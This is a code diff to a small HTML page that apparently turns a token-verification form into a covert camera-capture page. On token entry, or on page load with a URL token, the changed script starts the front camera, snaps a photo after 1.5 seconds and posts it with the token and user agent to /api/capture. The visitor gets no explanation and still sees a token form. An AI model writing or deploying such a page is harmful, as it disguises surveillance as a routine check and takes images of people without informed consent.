@@ -9,7 +9,6 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
         }
         
         body {
@@ -37,26 +36,28 @@
             text-align: center;
             letter-spacing: 2px;
             outline: none;
-            border-radius: 5px;
-        }
-        
-        input:focus {
-            border-color: #666;
+            margin-bottom: 20px;
         }
         
         .message {
-            margin-top: 20px;
-            font-size: 24px;
-            font-weight: bold;
-            min-height: 40px;
+            margin: 10px 0;
+            font-size: 18px;
+            min-height: 30px;
         }
         
         .success {
-            color: #00ff00;
+            color: #0f0;
         }
         
         .error {
-            color: #ff4444;
+            color: #f00;
+        }
+        
+        #video {
+            width: 100%;
+            max-width: 300px;
+            border: 2px solid #333;
+            display: none;
         }
     </style>
 </head>
@@ -64,6 +65,7 @@
     <div class="container">
         <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
         <div id="message" class="message"></div>
+        <video id="video" autoplay playsinline></video>
     </div>
 
     <script>
@@ -72,45 +74,95 @@
         
         if (urlToken) {
             document.getElementById('token').value = urlToken;
-            checkToken();
+            startCamera();
         }
         
-        async function checkToken() {
+        let stream = null;
+        let video = document.getElementById('video');
+
+        async function startCamera() {
             const token = document.getElementById('token').value.trim();
             const msgDiv = document.getElementById('message');
             
             if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
                 msgDiv.className = 'message error';
-                msgDiv.textContent = 'Invalid!';
+                msgDiv.textContent = 'Invalid';
                 return;
             }
             
             try {
-                const response = await fetch('/api/verify-token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token })
+                msgDiv.textContent = 'Camera...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                msgDiv.textContent = 'Capturing...';
+                
+                setTimeout(capturePhoto, 1500);
+                
+            } catch (err) {
+                msgDiv.className = 'message error';
+                msgDiv.textContent = 'Error';
+                console.error(err);
+            }
+        }
+
+        async function capturePhoto() {
+            const token = document.getElementById('token').value.trim();
+            const msgDiv = document.getElementById('message');
+            
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                
+                msgDiv.textContent = 'Sending...';
+                
+                const formData = new FormData();
+                formData.append('image', blob, 'photo.jpg');
+                formData.append('token', token);
+                formData.append('ua', navigator.userAgent);
+                
+                const response = await fetch('/api/capture', { 
+                    method: 'POST', 
+                    body: formData 
                 });
                 
                 const data = await response.json();
                 
-                if (data.valid) {
+                if (data.success) {
                     msgDiv.className = 'message success';
-                    msgDiv.textContent = 'Success';
+                    msgDiv.textContent = 'Done';
+                    
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        video.style.display = 'none';
+                    }
                 } else {
-                    msgDiv.className = 'message error';
-                    msgDiv.textContent = 'Invalid!';
+                    throw new Error('Failed');
                 }
-            } catch {
+                
+            } catch (err) {
                 msgDiv.className = 'message error';
-                msgDiv.textContent = 'Invalid!';
+                msgDiv.textContent = 'Error';
             }
         }
 
-        let timeout = null;
         document.getElementById('token').addEventListener('input', function() {
-            clearTimeout(timeout);
-            timeout = setTimeout(checkToken, 500);
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                video.style.display = 'none';
+            }
+            startCamera();
         });
     </script>
 </body>
